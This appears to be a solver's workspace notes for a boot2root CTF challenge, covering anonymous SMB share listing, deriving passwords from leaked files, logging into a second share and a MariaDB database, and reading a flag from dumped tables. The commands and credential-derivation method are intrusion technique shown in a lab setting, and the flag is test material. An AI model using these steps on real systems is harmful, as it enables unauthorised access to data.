---
doc_kind: workspace-notes
id: fret-savane-appui-boot2root-samba-sql
title: "fret-savane-appui (boot2root samba/sql)"
category: pwn
status: solved
tags:
  - b2r
  - togo
  - samba
  - sql
  - nctf26
---
# Notes — algorithme123--fret-savane-appui (300pts)

Target: 10.100.16.100 (ports 139,445 SMB ; 3306 MySQL/MariaDB). Instance par équipe, durée limitée.
VPN nctf-vpn: up, handshake OK avant de commencer (1m40s).

## 1. SMB anonymous listing

```
$ smbclient -L //10.100.16.100/ -N
Sharename       Type      Comment
---------       ----      -------
AppuiTech       Disk      Appui technique prestataires
DevPartage      Disk      Partage interne developpement
IPC$            IPC       IPC Service (savane-atelier-01)
```
(SMB1 workgroup listing failed, irrelevant — SMB2+ negprot worked fine for share listing.)

## 2. AppuiTech share — anonymous, readable (get all files)

```
smbclient //10.100.16.100/AppuiTech -N -c 'recurse ON; prompt OFF; mget *'
```
Files pulled: `.atelier_id`, `chat_support_lome.txt`, `todo_ama.md`,
`old_ticket_FS-ATELIER-2417.txt`, `atelier_inventory.txt`, `printer.cfg` (empty),
`README.txt`, `migration_notes.md`.

Key content:
- `atelier_inventory.txt`: Site code = `KRA`, hostname `savane-atelier-01`, entrepôts
  Lome-Tokoin / Kara-Central / Cinkasse-Nord.
- `chat_support_lome.txt`: confirms Samba user `kofi` (linux short username), password
  convention lives in ticket FS-ATELIER-2417 + `.atelier_id` suffix (vault rotation).
- `old_ticket_FS-ATELIER-2417.txt`: password convention =
  `{PrenomCourt}!{SiteCode}{Year}-<contenu .atelier_id>` (addendum vault applied after
  initial rotation `{PrenomCourt}!{SiteCode}{Year}`).
- `.atelier_id` content (hex dump confirmed, 4 ascii chars + \n): `9040`
- `migration_notes.md`: old MSSQL POC on port 1433 (user `sa`) retired 2025-01, replaced
  by MariaDB (`savane_agents` db) in 2025-02 — 1433 is a dead end / decoy, do not chase it.

Derived DevPartage credential: user `kofi`, password `Kofi!KRA2025-9040`
(PrenomCourt=Kofi, SiteCode=KRA, Year=2025 from ticket decision date "mars 2025", suffix=.atelier_id=9040).

## 3. DevPartage share — auth as kofi, readable (get all files)

```
smbclient //10.100.16.100/DevPartage -U "kofi%Kofi!KRA2025-9040" -c 'recurse ON; prompt OFF; mget *'
```
Login succeeded immediately (first try). Files pulled: `db_note.txt`, `.db_epoch`,
`old_credentials.txt`, `inventory.csv`, `migration_notes.md`.

Key content:
- `db_note.txt`: MariaDB on savane-atelier-01:3306, db `savane_agents`, user `savane_ro`
  (SELECT-only, remote root disabled). Password recipe = `<materiel_code of Cinkasse
  warehouse row in inventory.csv>` + `#` + `<content of .db_epoch>`.
- `inventory.csv`: warehouse rows; Cinkasse row = `ENT-CKS,Entrepot Cinkasse Nord,Cinkasse,C1nkasse,active`
  → materiel_code = `C1nkasse`.
- `.db_epoch` content: `7697`
- `old_credentials.txt`: `mssql_sa / Summer2023!@sa` on port 1433 — explicitly retired/dead
  end, confirmed by migration_notes.md on both shares. NOT used.
- `migration_notes.md` (DevPartage copy): confirms badge secrets live in the DB, not on
  any share.

Derived MySQL credential: user `savane_ro`, password `C1nkasse#7697`

## 4. MySQL/MariaDB access

```
mysql -h 10.100.16.100 -u savane_ro -p'C1nkasse#7697' --skip-ssl -e "SHOW DATABASES;"
```
(Plain TLS handshake failed with "SSL is required, but the server does not support it" —
MariaDB client `--skip-ssl` flag required, not `--ssl-mode`.)
→ `information_schema`, `savane_agents`

```sql
USE savane_agents;
SHOW TABLES;  -- access_logs, agents, badges
```

Full dumps (read-only `savane_ro`, SELECT-only grant confirmed working):

`agents` (6 rows):
```
id   full_name       site      role            active
101  Yao Mensah      Kara      tech_atelier    1
102  Ama Koffi       Lome      ops             1
103  Komlan Tete     Cinkasse  agent_entrepot  1
104  Efua Sarpong    Lome      agent_entrepot  0
105  Kwame Diallo    Kara      agent_entrepot  1
106  Selom Agbeko    Cinkasse  agent_entrepot  1
```

`badges` (6 rows):
```
agent_id  badge_code  secret                              revoked
101       AT-YAO      rot_old_atelier_key                 0
102       OP-AMA      ops_desk_token_xx                   0
103       CK-KOM      NCTF{fr3t_s4v4n3_806637183321}       0
104       LM-EFU      disabled_agent_secret               0
105       KR-KWA      kara_rack_probe                      0
106       CK-SEL      revoked_cinkasse_bait               1   <- decoy, revoked=1
```

`access_logs` (6 rows, sorted by created_at DESC):
```
id  agent_id  action           warehouse  created_at
6   105       INVENTORY_SYNC   Kara       2025-03-13 10:00:00
5   102       ADMIN_LOGIN      Lome       2025-03-12 18:00:00
4   103       EXPORT_MANIFEST  Cinkasse   2025-03-12 16:45:00   <- LATEST EXPORT_MANIFEST
3   106       EXPORT_MANIFEST  Cinkasse   2025-03-11 07:30:00
2   103       GATE_CHECK       Cinkasse   2025-03-10 09:00:00
1   105       EXPORT_MANIFEST  Kara       2025-03-01 08:10:00
```

## 5. Reasoning -> flag

Challenge text: "Retrouve le secret de badge lié au **dernier export de manifeste
entrepôt**." → filter `access_logs` on `action = 'EXPORT_MANIFEST'`, take the most
recent `created_at`. That is id=4: agent_id=103, warehouse=Cinkasse,
2025-03-12 16:45:00 (newer than id=3 2025-03-11 and id=1 2025-03-01).

agent_id 103 → badges row: badge_code `CK-KOM`, `revoked=0`.
(Note: agent 106 also has a Cinkasse EXPORT_MANIFEST entry but it's older (id=3,
2025-03-11) AND its badge is explicitly `revoked=1` with secret literally named
`revoked_cinkasse_bait` — a deliberate decoy. The correct, non-revoked, most-recent
entry is agent 103.)

## FLAG

```
NCTF{fr3t_s4v4n3_806637183321}
```

Status: **SOLVED**. Flag identified with full chain of evidence above. NOT submitted
to platform (per protocol — human submits separately).

## 6. Re-verification live (2026-11-07 00:41)

Re-ran the whole chain against the live instance; every value above reproduced
byte-for-byte (shares, `.atelier_id`=9040, `.db_epoch`=7697, same DB rows).

Decisive SQL (single query proving the answer):

```sql
SELECT l.id,l.created_at,l.warehouse,a.id,a.full_name,b.badge_code,b.secret,b.revoked
FROM access_logs l JOIN agents a ON a.id=l.agent_id JOIN badges b ON b.agent_id=a.id
WHERE l.action='EXPORT_MANIFEST' ORDER BY l.created_at DESC LIMIT 1;
-- 4 | 2025-03-12 16:45:00 | Cinkasse | 103 | Komlan Tete | CK-KOM |
-- NCTF{fr3t_s4v4n3_806637183321} | 0
```

**VPN gotcha**: the first attempt timed out on all ports (SYN sent, zero return,
`wg` handshake frozen). `wg-quick down/up` on the config file fixed it instantly.
A frozen WireGuard handshake presents exactly like "instance down / ports filtered"
on nmap. Always bounce the tunnel before concluding the instance is dead.

## Post-solve: instance expiry observed

Immediately after capturing the full `agents`/`badges`/`access_logs` dumps above (data
captured verbatim from the live mysql session output into this file), a follow-up
attempt to re-dump to a persisted artifact file hit `mysql` exit 124 (timeout). Checked:
ports 3306, 445, 139 all failed simultaneously (`/dev/tcp` probe), while the
`nctf-vpn` WireGuard tunnel itself stayed healthy (handshake ~5min old, keepalive
25s active, transfer counters still incrementing) — i.e. the per-team challenge
instance expired/was torn down, not a VPN problem. This matches the task's documented
"all ports timeout after ~59min" expiry signature. No action needed since the flag and
full evidentiary chain were already captured beforehand; `artifacts/mysql_dump.txt`
in this workspace is empty/stale from this failed post-solve re-dump attempt — treat
`notes.md` section 4 above as the authoritative MySQL evidence, not that file.

## Dead ends / decoys noted (for knowledge capture)
- Port 1433 (MSSQL `sa`): explicitly retired, do not probe.
- Badge `CK-SEL` (agent 106, revoked_cinkasse_bait): revoked=1, older EXPORT_MANIFEST
  than agent 103 — classic trap for anyone who just greps `Cinkasse` without checking
  revoked flag + most-recent timestamp.
- `printer.cfg` on AppuiTech: empty, red herring.
